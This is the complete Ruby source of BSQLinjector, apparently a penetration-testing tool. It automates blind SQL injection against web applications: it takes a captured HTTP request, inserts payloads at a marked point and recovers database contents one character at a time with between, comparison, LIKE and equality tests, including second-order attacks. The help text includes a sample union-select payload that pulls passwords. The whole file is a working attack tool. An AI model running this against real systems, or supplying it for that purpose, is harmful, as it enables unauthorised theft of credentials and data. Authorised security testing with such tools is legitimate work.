#!/usr/bin/env ruby

require 'uri'
require 'net/http'
require 'net/https'
require 'readline'

# CONFIGURE
$file = "" # file with vulnerable HTTP request
$secfile = "" # file with second request (2nd order)
$prepend = "" # most of SQL statement
$append = "" # how to end SQL statement

$proto = "http" # protocol to use - http/https
$proxy = "" # proxy host
$proxy_port = "" # proxy port

$mode = "b" # mode to use (between - b (default - this mode generates less requests), moreless - a (this mode generates less requests by comparing characters using \"<\", \">\", \"=\" characters), like - l (complete bruteforce with like), equals - e (complete bruteforce with =))
$hex = "n" # if hex should be used in comparing

$max = 1000; # maximum chars to enumerate
$search = ""; # what is the pattern to look for when query is TRUE

$comma = "n" # if comma should be URL encoded
$oh = "" # this character is used when opening string when comparing
$bracket = ")" # substring ending brackets
$case = "n" # setting case sensitivity
$hexbracket = "y" # hex delimeter - bracket (y) or space (n)
$showletter = "y" # if each enumerated letter should be shown

$verbose = "n" # verbose messaging
$test = "n" # test mode
timeout = 20 # timeout for receiving responses
alls = "n" # if all special characters should be included in enumeration
run = 0 # parameter specifies if program should continue when always true condition is detected

$i = 0 # main counter for characters

# set all variables
ARGV.each do |arg|
	$file = arg.split("=")[1] if arg.include?("--file=")
	$proto = "https" if arg.include?("--ssl")
	$proxy = arg.split("=")[1].split(":")[0] if arg.include?("--proxy=")
	$proxy_port = arg.split("=")[1].split(":")[1] if arg.include?("--proxy=")
	$verbose = "y" if arg.include?("--verbose")
	timeout = Integer(arg.split("=")[1]) if arg.include?("--timeout=")
	$comma = "y" if arg.include?("--comma")
	$secfile = arg.split("=")[1] if arg.include?("--2ndfile=")
	$max = arg.split("=")[1].to_i if arg.include?("--max=")
	$mode = arg.split("=")[1] if arg.include?("--mode=")
	$hex = "y" if arg.include?("--hex")
	$oh = arg.split("=")[1] if arg.include?("--schar=")
	$case = "y" if arg.include?("--case")
	$i = arg.split("=")[1].to_i - 1 if arg.include?("--start=")
	$test = "y" if arg.include?("--test")
	$bracket = arg.split("=")[1].to_i - 1 if arg.include?("--bracket=")
	alls = "y" if arg.include?("--special")
	$showletter = "n" if arg.include?("--only-final")
	$hexbracket = "n" if arg.include?("--hexspace")
	$search = arg.split("=")[1] if arg.include?("--pattern=") && arg.count("=") == 1
	$prepend = arg.split("=")[1] if arg.include?("--prepend=") && arg.count("=") == 1
	$append = arg.split("=")[1] if arg.include?("--append=") && arg.count("=") == 1
	$search = arg.split("=")[1..-1].join("=") if arg.include?("--pattern=") && arg.count("=") > 1
	$prepend = arg.split("=")[1..-1].join("=") if arg.include?("--prepend=") && arg.count("=") > 1
	$append = arg.split("=")[1..-1].join("=") if arg.include?("--append=") && arg.count("=") > 1
end

# show main menu
if ARGV.nil? || ARGV.size < 3 || $file == "" || ($search == "" && $test == "n")
	puts "BSQLinjector by Jakub Pa\u0142aczy\u0144ski"
	puts ""
	puts "BSQLinjector uses blind method to retrieve data from SQL databases."
	puts ""
	puts "Options:"
	puts "  --file	Mandatory - File containing valid HTTP request and SQL injection point (SQLINJECT). (--file=/tmp/req.txt)"
	puts "  --pattern	Mandatory - Pattern to look for when query is true. (--pattern=truestatement)"
	puts "  --prepend	Mandatory - Main payload. (--prepend=\"abcd\'and\'a\'=\'b\'+union+select+\'truestatement\'+from+table+where+col%3d\'value\'+and+substr(password,\""
	puts "  --append	How to end our payload. For example comment out rest of SQL statement. (--append=\'#)"
	puts "  --schar	Character placed around chars. This character is not used while in hex mode. (--schar=\"\'\")"
	puts "  --2ndfile	File containing valid HTTP request used in second order exploitation. (--2ndfile=/tmp/2ndreq.txt)"
	puts ""
	puts "  --mode	Blind mode to use - (between - b (generates less requests), moreless - a (generates less requests by using \"<\", \">\", \"=\" characters), like - l (complete bruteforce), equals - e (complete bruteforce)). (--mode=l)"
	puts "  --hex		Use hex to compare instead of characters."
	puts "  --case	Case sensitivity."
	puts ""
	puts "  --ssl		Use SSL."
	puts "  --proxy	Proxy to use. (--proxy=127.0.0.1:8080)"
	puts ""
	puts "  --test	Enable test mode. Do not send request, just show full payload."
	puts "  --special	Include all special characters in enumeration."
	puts "  --start	Start enumeration from specified character. (--start=10)"
	puts "  --max		Maximum characters to enumerate. (--max=10)"
	puts "  --timeout	Timeout in waiting for responses. (--timeout=20)"
	puts "  --only-final	Stop showing each enumerated letter."
	puts "  --comma	Encode comma."
	puts "  --bracket	Add brackets to the end of substring function. --bracket=\"))\""
	puts "  --hexspace	Use space instead of brackets to split hex values."
	puts "  --verbose	Show verbose messages."
	puts ""
	puts "Example usage:"
	puts "  ruby #{__FILE__} --pattern=truestatement --file=/tmp/req.txt --schar=\"'\" --prepend=\"abcd\'and\'a\'=\'b\'+union+select+\'truestatement\'+from+table+where+col%3d\'value\'+and+substr(password,\" --append=\"\'#\" --ssl"
	puts ""
	exit(1)
else
	puts "BSQLinjector by Jakub Pa\u0142aczy\u0144ski"
	puts ""
end

# EXECUTION

# holds HTTP responses
$response = ""

# arrays for Blind exploitation
$arrs = [",", "_", "."]
if alls == "y"
	$arrs += ["+", "/", "=", ":", "-", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "~", "`", "[", "]", "{", "}", ";", "<", ">", "?", "|", "\\", "\""]
end
$arrn1 = ["0", "1", "2", "3", "4"]
$arrn2 = ["5", "6", "7", "8", "9"]
$arr1 = ["a", "b", "c"]
$arr2 = ["d", "e", "f"]
$arr3 = ["g", "h", "i"]
$arr4 = ["j", "k", "l", "m"]
$arr5 = ["n", "o", "p"]
$arr6 = ["q", "r", "s"]
$arr7 = ["t", "u", "v"]
$arr8 = ["w", "x", "y", "z"]

# for case sensitive
$arr9 = ["A", "B", "C"]
$arr10 = ["D", "E", "F"]
$arr11 = ["G", "H", "I"]
$arr12 = ["J", "K", "L", "M"]
$arr13 = ["N", "O", "P"]
$arr14 = ["Q", "R", "S"]
$arr15 = ["T", "U", "V"]
$arr16 = ["W", "X", "Y", "Z"]

$arrays = $arr1 + $arr2 + $arr3 + $arr4 + $arr5 + $arr6 + $arr7 + $arr8 + $arrn1 + $arrn2 + $arrs
$arraysc = $arr1 + $arr2 + $arr3 + $arr4 + $arr5 + $arr6 + $arr7 + $arr8 + $arr9 + $arr10 + $arr11 + $arr12 + $arr13 + $arr14 + $arr15 + $arr16 + $arrn1 + $arrn2 + $arrs

# other parameters
$result = ""

### Processing Request File ###

# Configure basic options

# set proxy
if $proxy == ""
	$proxy = nil
	$proxy_port = nil
end

if $hex == "y"
	$oh = ""
end

# get connection host and port
z = 1
loop do
	break if File.readlines($file)[z].chomp.empty?
	if File.readlines($file)[z].include?("Host: ")
		$remote = File.readlines($file)[z].split(" ")[1]
		if $proto == "http"
			$port = 80
		else
			$port = 443
		end
		if $remote.include?(":")
			$port = $remote.split(":")[1]
			$remote = $remote.split(":")[0]
		end
	end
	z = z + 1
end

# Configure main request
def configreq(chars)

	# test mode
	if $test == "y"
		puts "Payload example:"
		if $comma == "y"
			puts $prepend + $i.to_s + "%2C1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append
		else
			puts $prepend + $i.to_s + ",1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append
		end
		exit(1)
	end

	# check HTTP method
	if File.readlines($file)[0].include?("GET ")
		$method = "get"
	else
		$method = "post"
	end

	found = 0 # for detecting injected payload

	# get URI path
	$uri = File.readlines($file)[0].split(" ")[1]
	turi = URI.decode($uri).gsub("+", " ")
	if turi.include?("SQLINJECT")
		if $comma == "y"
			$uri = $uri.sub("SQLINJECT", $prepend + $i.to_s + "%2C1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append)
		else
			$uri = $uri.sub("SQLINJECT", $prepend + $i.to_s + ",1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append)
		end
		found = found + 1
	end
	
	# get headers
	i = 1
	$headers = Hash.new
	loop do
		break if File.readlines($file)[i].chomp.empty?
		if !File.readlines($file)[i].include?("Host: ")
			header = File.readlines($file)[i].chomp
			if header.include?("SQLINJECT")
				if $comma == "y"
					header = header.sub("SQLINJECT", $prepend + $i.to_s + "%2C1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append)
				else
					header = header.sub("SQLINJECT", $prepend + $i.to_s + ",1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append)
				end
				found = found + 1
			end
			if header.include?("Accept-Encoding")
			else
				$headers[header.split(": ")[0]] = header.split(": ")[1]
			end
		end
		i = i + 1
	end

	# get POST body
	i = i + 1
	$post = ""
	postfind = 0
	if $method == "post"
		loop do
			break if File.readlines($file)[i].nil?
			postline = File.readlines($file)[i]
			tline = postline.gsub("+", " ")
			if tline.include?("SQLINJECT")
				if $comma == "y"
					postline = postline.sub("SQLINJECT", $prepend + $i.to_s + "%2C1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append)
				else
					postline = postline.sub("SQLINJECT", $prepend + $i.to_s + ",1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append)
				end
				found = found + 1
			end
			$post += postline
			i = i + 1
		end
	end

	# update Content-Length header
	if $method == "post"
		$headers["Content-Length"] = String($post.bytesize)
	end

	# detect injection point
	if found == 0
		puts "Please specify injection point. Put \"SQLINJECT\" in place where payload should be injected."
		exit(1)
	elsif found > 1
		puts "Multiple instances of injection point found. Please specify only one injection point."
		exit(1)
	end

	# configuring request
	$request = Net::HTTP.new($remote, $port, $proxy, $proxy_port)

	# set HTTPS
	if $proto == "https"
		$request.use_ssl = true
		$request.verify_mode = OpenSSL::SSL::VERIFY_NONE
	end
end

### End of Processing Request File ###

### Configure request for 2nd order case ###
if $secfile != ""

	# check HTTP method
	if File.readlines($secfile)[0].include?("GET ")
		$secmethod = "get"
	else
		$secmethod = "post"
	end

	# get URI path
	$securi = File.readlines($secfile)[0].split(" ")[1]

	# get headers
	y = 1
	$secheaders = Hash.new
	loop do
		break if File.readlines($secfile)[y].chomp.empty?
		if !File.readlines($secfile)[y].include?("Host: ")
			header = File.readlines($secfile)[y].chomp
			if header.include?("Accept-Encoding")
			else
				$secheaders[header.split(": ")[0]] = header.split(": ")[1]
			end
		end
		y = y + 1
	end

	# get POST body
	y = y + 1
	$secpost = ""
	if $method == "post"
		loop do
			break if File.readlines($secfile)[y].nil?
			postline = File.readlines($secfile)[y]
			$secpost += postline
			y = y + 1
		end
	end

	# configuring 2nd request
	$secrequest = Net::HTTP.new($remote, $port, $proxy, $proxy_port)

	# set HTTPS
	if $proto == "https"
		$secrequest.use_ssl = true
		$secrequest.verify_mode = OpenSSL::SSL::VERIFY_NONE
	end
end

### End of Processing 2nd Request File ###

# Sending request
def sendreq()
	
	if $verbose == "y"
		puts "Sending request:"
		if $proto == "http"
			puts "http://#{$remote}:#{$port}#{$uri}"
			puts $headers
			puts "\n"
			puts $post
			puts "\n"
		else
			puts "https://#{$remote}:#{$port}#{$uri}"
			puts $headers
			puts "\n"
			puts $post
			puts "\n"
		end
	end
	
	$response = ""
	$request.start { |r|
		begin
			status = Timeout::timeout($time) {
    				if $method == "post"
					$response = r.post($uri, $post, $headers) 
				else
					$response = r.get($uri, $headers)
				end
  			}
		rescue Timeout::Error
		end
	}
end

# Sending second request
def send2ndreq()
	
	if $verbose == "y"
		puts "Sending second request:"
		if $proto == "http"
			puts "http://#{$remote}:#{$port}#{$securi}"
			puts $secheaders
			puts "\n"
			puts $secpost
			puts "\n"
		else
			puts "https://#{$remote}:#{$port}#{$securi}"
			puts $secheaders
			puts "\n"
			puts $secpost
			puts "\n"
		end
	end
	
	$response = ""
	$secrequest.start { |r|
		begin
			status = Timeout::timeout($time) {
    				if $method == "post"
					$response = r.post($securi, $secpost, $secheaders) 
				else
					$response = r.get($securi, $secheaders)
				end
  			}
		rescue Timeout::Error
		end
	}
end

# create between payload
def cbetween(a, b, c)
	if $hex == "y"
		if $hexbracket == "n"
			configreq("between" + " 0x" + a.unpack('H*')[0] + " and " + "0x" + b.unpack('H*')[0])
		else
			configreq("between" + "(0x" + a.unpack('H*')[0] + ")and(" + "0x" + b.unpack('H*')[0] + ")")
		end
	else
		configreq("between" + $oh + a + $oh + "and" + $oh + b)
	end
	sendreq()
	send2ndreq() if $secfile != ""
	$fheader = "n"
	$response.to_hash.each { |k,v|
		$fheader = "y" if k.to_s.include?($search)
		$fheader = "y" if v.to_s.include?($search)
	}
	if ($response.body.include?($search) || $fheader == "y") && c == "yes"
		$result = $result + a
	       	puts "Letter " + $i.to_s + " found: " + a if $showletter == "y"
		$letter = 1
	end
end

# creating moreless payload
def cmoreless(a, b, c)
	if $hex == "y"
		if $hexbracket == "n"
			configreq(a + " 0x" + b.unpack('H*')[0])
		else
			configreq(a + "(0x" + b.unpack('H*')[0] + ")")
		end
	else
		configreq(a + $oh + b)
	end
	sendreq()
	send2ndreq() if $secfile != ""
	$fheader = "n"
	$response.to_hash.each { |k,v|
		$fheader = "y" if k.to_s.include?($search)
		$fheader = "y" if v.to_s.include?($search)
	}
	if ($response.body.include?($search) || $fheader == "y") && c == "yes"
		$result = $result + b
	      	puts "Letter " + $i.to_s + " found: " + b if $showletter == "y"
		$letter = 1
	end
end

# creating like payload
def clike(a)
	if $hex == "y"
		if $hexbracket == "n"
			configreq("like" + " " + "0x" + a.unpack('H*')[0])
		else
			configreq("like" + "(" + "0x" + a.unpack('H*')[0] + ")")
		end
	else
		configreq("like" + $oh + a)
	end
	sendreq()
	send2ndreq() if $secfile != ""
	$fheader = "n"
	$response.to_hash.each { |k,v|
		$fheader = "y" if k.to_s.include?($search)
		$fheader = "y" if v.to_s.include?($search)
	}
	if $response.body.include?($search) || $fheader == "y"
		$result = $result + a
		puts "Letter " + $i.to_s + " found: " + a if $showletter == "y"
		$letter = 1
	end
end

# creating equal payload
def cequal(a)
	if $hex == "y"
		if $hexbracket == "n"
			configreq("=" + "0x" + a.unpack('H*')[0])
		else
			configreq("=" + "(0x" + a.unpack('H*')[0] + ")")
		end
	else
		configreq("=" + $oh + a)
	end
	sendreq()
	send2ndreq() if $secfile != ""
	$fheader = "n"
	$response.to_hash.each { |k,v|
		$fheader = "y" if k.to_s.include?($search)
		$fheader = "y" if v.to_s.include?($search)
	}
	if $response.body.include?($search) || $fheader == "y"
		$result = $result + a
		puts "Letter " + $i.to_s + " found: " + a if $showletter == "y"
		$letter = 1
	end
end

# do enumeration
until $i >= $max  do
	$i = $i + 1
	$letter = 0
	if $result == "aaaaa" && run == 0
        	puts "It seems like your payload gives always true condition. Maybe you should try another parameter\'s value or different payload. Quit (Y/N)?\n";
		choice = Readline.readline("> ", true)
        		if choice == "y" || choice == "Y"
				break
			else
				run = 1
			end
        end

	if $mode == "e"
		if $case == "n"
			for ch in $arrays
				cequal(ch)
				if $letter == 1
					break
				end
			end
		else
			for ch in $arraysc
				cequal(ch)
				if $letter == 1
					break
				end
			end
		end
	elsif $mode == "l"
		if $case == "n"
			for ch in $arrays
				if ch != "%" && ch != "_"
					clike(ch)
					if $letter == 1
						break
					end
				else
					cequal(ch)
					if $letter == 1
						break
					end
				end
			end
		else
			for ch in $arraysc
				if ch != "%" && ch != "_"
					clike(ch)
					if $letter == 1
						break
					end
				else
					cequal(ch)
					if $letter == 1
						break
					end
				end
			end
		end

	elsif $mode == "b"

		# lowercase
		cbetween("a", "z", "no")
		if $response.body.include?($search) || $fheader == "y"
			cbetween("a", "m", "no")
			if $response.body.include?($search) || $fheader == "y"
				cbetween("a", "f", "no")
				if $response.body.include?($search) || $fheader == "y"
					cbetween("a", "c", "no")
					if $response.body.include?($search) || $fheader == "y"
						for ch in $arr1
							cbetween(ch, ch, "yes")
							if $letter == 1
								break
							end
						end
					else
						for ch in $arr2
							cbetween(ch, ch, "yes")
							if $letter == 1
								break
							end
						end
					end
				else
					cbetween("g", "i", "no")
					if $response.body.include?($search) || $fheader == "y"
						for ch in $arr3
							cbetween(ch, ch, "yes")
							if $letter == 1
								break
							end
						end
					else
						for ch in $arr4
							cbetween(ch, ch, "yes")
							if $letter == 1
								break
							end
						end
					end
				end
			else
				cbetween("n", "s", "no")
				if $response.body.include?($search) || $fheader == "y"
					cbetween("n", "p", "no")
					if $response.body.include?($search) || $fheader == "y"
						for ch in $arr5
							cbetween(ch, ch, "yes")
							if $letter == 1
								break
							end
						end
					else
						for ch in $arr6
							cbetween(ch, ch, "yes")
							if $letter == 1
								break
							end
						end
					end
				else
					cbetween("t", "v", "no")
					if $response.body.include?($search) || $fheader == "y"
						for ch in $arr7
							cbetween(ch, ch, "yes")
							if $letter == 1
								break
							end
						end
					else
						for ch in $arr8
							cbetween(ch, ch, "yes")
							if $letter == 1
								break
							end
						end
					end
				end
			end
		end

		# uppercase - only when case-sensitive specified
		if $case == "y" && $letter == 0
			cbetween("A", "Z", "no")
			if $response.body.include?($search) || $fheader == "y"
				cbetween("A", "M", "no")
				if $response.body.include?($search) || $fheader == "y"
					cbetween("A", "F", "no")
					if $response.body.include?($search) || $fheader == "y"
						cbetween("A", "C", "no")
						if $response.body.include?($search) || $fheader == "y"
							for ch in $arr9
								cbetween(ch, ch, "yes")
								if $letter == 1
									break
								end
							end
						else
							for ch in $arr10
								cbetween(ch, ch, "yes")
								if $letter == 1
									break
								end
							end
						end
					else
						cbetween("G", "I", "no")
						if $response.body.include?($search) || $fheader == "y"
							for ch in $arr11
								cbetween(ch, ch, "yes")
								if $letter == 1
									break
								end
							end
						else
							for ch in $arr12
								cbetween(ch, ch, "yes")
								if $letter == 1
									break
								end
							end
						end
					end
				else
					cbetween("N", "S", "no")
					if $response.body.include?($search) || $fheader == "y"
						cbetween("N", "P", "no")
						if $response.body.include?($search) || $fheader == "y"
							for ch in $arr13
								cbetween(ch, ch, "yes")
								if $letter == 1
									break
								end
							end
						else
							for ch in $arr14
								cbetween(ch, ch, "yes")
								if $letter == 1
									break
								end
							end
						end
					else
						cbetween("T", "V", "no")
						if $response.body.include?($search) || $fheader == "y"
							for ch in $arr15
								cbetween(ch, ch, "yes")
								if $letter == 1
									break
								end
							end
						else
							for ch in $arr16
								cbetween(ch, ch, "yes")
								if $letter == 1
									break
								end
							end
						end
					end
				end
			end
		end

		# numeric
		if $letter == 0
			cbetween("0", "9", "no")
			if $response.body.include?($search) || $fheader == "y"
				cbetween("0", "4", "no")
				if $response.body.include?($search) || $fheader == "y"
					for ch in $arrn1
						cbetween(ch, ch, "yes")
						if $letter == 1
							break
						end
					end
				else
					for ch in $arrn2
						cbetween(ch, ch, "yes")
						if $letter == 1
							break
						end
					end
				end
			end
		end

		# special character
		if $letter == 0
			for ch in $arrs
				cbetween(ch, ch, "yes")
				if $letter == 1
					break
				end
			end
		end

	elsif $mode == "a"

		# lowercase
		cmoreless(">=", "a", "no")
		if $response.body.include?($search) || $fheader == "y"
			cmoreless("<=", "m", "no")
			if $response.body.include?($search) || $fheader == "y"
				cmoreless("<=", "f", "no")
				if $response.body.include?($search) || $fheader == "y"
					cmoreless("<=", "c", "no")
					if $response.body.include?($search) || $fheader == "y"
						for ch in $arr1
							cmoreless("=", ch, "yes")
							if $letter == 1
				   	                    	break
							end
						end
					else
						for ch in $arr2
							cmoreless("=", ch, "yes")
							if $letter == 1
				   	                    	break
							end
						end
					end
				else
					cmoreless("<=", "i", "no")
					if $response.body.include?($search) || $fheader == "y"
						for ch in $arr3
							cmoreless("=", ch, "yes")
							if $letter == 1
				   	                    	break
							end
						end
					else
						for ch in $arr4
							cmoreless("=", ch, "yes")
							if $letter == 1
				   	                    	break
							end
						end
					end
				end
			else
				cmoreless("<=", "s", "no")
				if $response.body.include?($search) || $fheader == "y"
					cmoreless("<=", "p", "no")
					if $response.body.include?($search) || $fheader == "y"
						for ch in $arr5
							cmoreless("=", ch, "yes")
							if $letter == 1
				   	                    	break
							end
						end
					else
						for ch in $arr6
							cmoreless("=", ch, "yes")
							if $letter == 1
				   	                    	break
							end
						end
					end
				else
					cmoreless("<=", "v", "no")
					if $response.body.include?($search) || $fheader == "y"
						for ch in $arr7
							cmoreless("=", ch, "yes")
							if $letter == 1
				   	                    	break
							end
						end
					else
						for ch in $arr8
							cmoreless("=", ch, "yes")
							if $letter == 1
				   	                    	break
							end
						end
					end
				end
			end
		end

		# uppercase - only when case-sensitive specified
		if $case == "y" && $letter == 0
			cmoreless(">=", "A", "no")
			if $response.body.include?($search) || $fheader == "y"
				cmoreless("<=", "M", "no")
				if $response.body.include?($search) || $fheader == "y"
					cmoreless("<=", "F", "no")
					if $response.body.include?($search) || $fheader == "y"
						cmoreless("<=", "C", "no")
						if $response.body.include?($search) || $fheader == "y"
							for ch in $arr9
								cmoreless("=", ch, "yes")
								if $letter == 1
					   	                    	break
								end
							end
						else
							for ch in $arr10
								cmoreless("=", ch, "yes")
								if $letter == 1
					   	                    	break
								end
							end
						end
					else
						cmoreless("<=", "I", "no")
						if $response.body.include?($search) || $fheader == "y"
							for ch in $arr11
								cmoreless("=", ch, "yes")
								if $letter == 1
					   	                    	break
								end
							end
						else
							for ch in $arr12
								cmoreless("=", ch, "yes")
								if $letter == 1
					   	                    	break
								end
							end
						end
					end
				else
					cmoreless("<=", "S", "no")
					if $response.body.include?($search) || $fheader == "y"
						cmoreless("<=", "P", "no")
						if $response.body.include?($search) || $fheader == "y"
							for ch in $arr13
								cmoreless("=", ch, "yes")
								if $letter == 1
					   	                    	break
								end
							end
						else
							for ch in $arr14
								cmoreless("=", ch, "yes")
								if $letter == 1
					   	                    	break
								end
							end
						end
					else
						cmoreless("<=", "V", "no")
						if $response.body.include?($search) || $fheader == "y"
							for ch in $arr15
								cmoreless("=", ch, "yes")
								if $letter == 1
					   	                    	break
								end
							end
						else
							for ch in $arr16
								cmoreless("=", ch, "yes")
								if $letter == 1
					   	                    	break
								end
							end
						end
					end
				end
			end
		end

		# numeric
		if $letter == 0
			cmoreless(">=", "0", "no")
			if $response.body.include?($search) || $fheader == "y"
				cmoreless("<=", "4", "no")
				if $response.body.include?($search) || $fheader == "y"
					for ch in $arrn1
						cmoreless("=", ch, "yes")
						if $letter == 1
			   	                    	break
						end
					end
				else
					for ch in $arrn2
						cmoreless("=", ch, "yes")
						if $letter == 1
			   	                    	break
						end
					end
				end
			end
		end

		# special character
		if $letter == 0
			for ch in $arrs
				cmoreless("=", ch, "yes")
				if $letter == 1
			   		break
				end
			end
		end
	end

	# printing results
	if $letter == 0
		if $result == ""
        		puts "No results. Probably wrong pattern."
	            	break
	        else 
			puts "\nFull result:\n" + $result
			break
	        end
        end
end

# means that there are still chars to enumerate
if $letter == 1
	puts "\nRetreving not finished:\n" + $result
end
